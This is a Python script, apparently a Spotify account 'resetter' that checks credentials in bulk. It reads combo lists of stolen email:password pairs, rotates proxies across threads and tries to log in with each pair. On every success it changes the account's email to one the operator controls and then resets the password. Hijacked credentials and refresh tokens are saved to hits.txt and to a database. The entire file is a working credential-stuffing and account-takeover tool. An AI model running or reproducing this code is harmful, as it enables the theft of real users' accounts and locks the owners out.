import random, string
import os
from time import sleep
from urllib import request
import pyfiglet
from PyInquirer import prompt
import tkinter.filedialog
from requests import session
import database
from modules import Spotify
import requests
from threading import Thread,Lock
import datetime
from helper import log,get_traceback

lock = Lock()
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Resetter():
    def __init__(self,platform=None,  protocol=None, accounts=None, threads=None, email=None,proxies=None) -> None:
        self.heading =pyfiglet.Figlet(font="speed").renderText("Speed")[:-25] + "Made with ❤  by oko"
        "*\log(-1,self.heading)\*"
        self.proxies = None
        self.thread = 0
        self.Total = 0
        self.errcount = 0
        self.database = None
        self.hits = 0
        self.checked = 0
        self.combos = None
        self.emailchanged = 0
        self.passchanged = 0
        if platform == 'Spotify':
            while self.combos == None:
                self.combos = accounts
            log(-1,f'Loading combos from {self.combos}')

            with open(self.combos,'r',encoding="utf8") as file:
                data = file.readlines()
                 
                log(-1,'Combos Loaded : '+'\n'.join(data[4:-1]))
                self.combosdict = iter(data[4:-1])
                
                self.combosize = len(data[4:-1])
            log(-1,f'Loaded {self.combosize} combos')

            if proxies != None:
                log(-1,f'Loading proxies from {proxies}')
                with open(proxies,'r') as file:
                    self.proxydata = file.readlines()
                    log(-1,'Proxies Loaded : '+'\n'.join(self.proxydata))
                    self.proxydict = iter(self.proxydata)
                    self.proxysize = len(self.proxydata)
                    self.proxies = True
            else:
                self.proxies = False
                self.proxydict = None
                self.proxysize = 0
            log(-1,f'Loaded {(self.proxysize)} proxies')

            self.threads = threads
            if email != None:
                self.newemail = email
            else:
                self.newemail = False
            self.protocol = protocol
            self.minecraft(True)
        else:   
            questions = [
                {
                    'type': 'list',
                    'name': 'Menu',
                    'message': 'Choose Module',
                    'choices' : [
                        'Spotify',
                    ]
                }
            ]
            answers = prompt(questions)

            if answers['Menu'] == 'Spotify' :
                self.minecraft()

    def updateproxy(self):
        try:
            if(self.proxies):
                return next(self.proxydict)
        except Exception:
            self.proxydict = iter(self.proxydata)
            return next(self.proxydict)

    def updatecombos(self):
        self.combosize -= 1
        return next(self.combosdict)

    def minecraft(self, bash=False):
        
        if not bash:
            log(-1, "in bash if")
            while self.combos == None:
                log(-1,f'{bcolors.OKGREEN}Please select a combo file{bcolors.ENDC}')
                self.combos = tkinter.filedialog.askopenfilenames()
            log(-1,f'Loading combos from {self.combos[0]}')

            with open(self.combos[0],'r',encoding="utf8") as file:
                data = file.readlines()
                self.combosdict = iter(data)
                self.combosize = len(data)
            log(-1,f'Loaded {self.combosize} combos')


            if(input('Wanna use proxies (y/n)').lower()=='y'):
                self.proxies = True
                proxies = tkinter.filedialog.askopenfilenames()
                questions = [
                    {
                        'type': 'list',
                        'name': 'Menu',
                        'message': 'Choose proxies format',
                        'choices' : [
                            'HTTP',
                            'SOCKS4',
                            'SOCKS5'
                        ]
                    }
                ]
                answers = prompt(questions)
            else:
                proxies = None
                self.proxies = False

            if proxies:
                log(-1,f'Loading proxies from {proxies}')
                with open(proxies[0],'r') as file:
                    self.proxydata = file.readlines()
                    self.proxydict = iter(self.proxydata)
                    self.proxysize = len(data)
                
            else:
                self.proxies = False
                self.proxydict = None
                self.proxysize = 0
            log(-1,f'Loaded {(self.proxysize)} proxies')

            self.threads = int(input('Enter threads you want to run:'))
            if input('Do you want to change email (y/n)').lower() == 'y':
                self.newemail = input('Enter new email: ')
            else:
                self.newemail = False
        else:
            pass
            

        i=0
        for i in range(self.threads):
            self.starttime = datetime.datetime.now()
            #print(f'Starting thread {i}')
            Thread(target=self.start, args=(i,)).start()
        self.total = self.combosize
        while True:
            sleep(1)
            
            if self.checked == self.total:
                break
            time = datetime.datetime.now()-self.starttime
            log(-1,f'\n\n{bcolors.OKGREEN}Total: {self.total} | Checked: {self.checked} | CPM: {self.checked/float(time.total_seconds() / 60)}{bcolors.ENDC}')
            log(-1,f'{bcolors.OKGREEN}Hits: {self.hits} | Email Changed: {self.emailchanged} | Password Changed: {self.passchanged}! error :{self.errcount}{bcolors.ENDC}')
            
    def start(self, threadnum):
        
        while self.combosize > 0:
            try:
                log(threadnum,f"Trying to get account on thread {threadnum}")
                data = self.updatecombos().split(":")
                if data[0] =="\n":
                    self.checked=self.total
                    break
                proxy=False
                
                while True:
                    if self.proxies:
                        while True:
                            proxy = self.updateproxy().strip() if self.proxies else None
                            print(f"Trying {data[0].strip()}:{data[1].strip()} with proxy {proxy} on thread {threadnum}")
                            log(threadnum,f"Trying {data[0].strip()}:{data[1].strip()} with proxy {proxy} on thread {threadnum}")
                            
                            if proxy != False:
                                break
                    print(f"Trying {data[0].strip()}:{data[1].strip()} with proxy {proxy} on thread {threadnum}")
                    log(threadnum,f"Trying {data[0].strip()}:{data[1].strip()} with proxy {proxy}")    
                    s= Spotify(threadnum,data[0].strip(),data[1].strip(),proxy)
                    Login = s.login()
                    print(f"{Login} for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                    log(threadnum,f"{Login} for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                    
                    if Login==True:
                        lock.acquire()
                        self.hits = self.hits+1
                        lock.release()
                        #print(f"Login succesfull for {data[0].strip()}:{data[1].strip()}")
                        if self.newemail:
                            
                            x= self.newemail.split("@")[0]+"+"+''.join(random.choices(string.ascii_letters + string.digits, k=16))+"@"+self.newemail.split("@")[1]
                            #print(f"changing email to {x}")
                            if s.changeEmail(x):
                                lock.acquire()
                                self.emailchanged = self.emailchanged +1
                                lock.release()
                                #self.saveToTxt(x,s.password,s.refreshToken)
                                s.email = x
                                if s.jumpAndChange():
                                    lock.acquire()
                                    self.passchanged = self.passchanged +1
                                    lock.release()
                                    self.saveToTxt(s.email, s.email+"cc", s.refreshToken)
                                    self.saveToDB(s.email, s.email+"cc", s.refreshToken)
                                    break
                                else:
                                    self.checked = self.checked+1
                                    with open("failed.txt","a") as f:
                                        f.write(f"{s.email}:{s.password}cc")
                                    log(-1,f"Failed to change password for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                                    break
                            else:
                                self.checked = self.checked+1
                                log(-1,f"Failed to change email for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                                break
                        else:
                            self.checked = self.checked+1
                            self.saveToTxt(data[0].strip(),data[1].strip(),s.refreshToken)
                            break
                    elif Login == "proxyerror": 
                        log(threadnum,Login)
                        self.errcount = self.errcount+1
                        log(-1,f"Login failed for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                        pass
                    else:
                        self.checked = self.checked+1
                        log(-1,f"Login failed for {data[0].strip()}:{data[1].strip()} on thread {threadnum}")
                        break
            except IndexError:
                log(-1,f"IndexError on thread {threadnum} {data}")
                break
            except Exception as e:

                """write to error.txt with threadnum as thread id and e as error"""
                with open('error.txt', 'a') as f:
                    f.write(f"Thread {threadnum} error: {get_traceback(e)}\n")
                    log(-1,f"Thread {threadnum} error: {get_traceback(e)}\n")


    def saveToTxt(self, email, password, refresh_token):
        lock.acquire()
        with open('hits.txt', 'a') as f:
            f.write(email+':'+password+':'+str(refresh_token)+"\n")
        lock.release()


    def saveToDB(self,email,password,refresh):
        if self.database==None:
            import json
            dbconfig =  json.loads(open('.\database.txt', "r").read())
            DB = database.database(dbconfig['Username'],dbconfig['password'],dbconfig['Cluster'])
            
        else:
            pass
        acc = {
            "email":email,
            "pass":password,
            "token":refresh,
            "InUse":False,
            "Working":True,
        }
        DB.add(acc)

            
        
try:
    import argparse
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--platform', type=str,default=None)
    parser.add_argument('--file', type=str,default=None)
    parser.add_argument('--proxies', type=str,default=None) 
    parser.add_argument('--email', type=str,default=None)
    args = parser.parse_args()
    log(-1, f"arguments scanned {args} ")
    Resetter(args.platform,"HTTP",args.file,1,args.email,args.proxies)
except Exception as e:
    """save to error.txt"""
    with open('error.txt', 'a') as f:
        f.write(str(get_traceback(e))+"\n\n\n")
        log(-1, f"error {get_traceback(e)} ")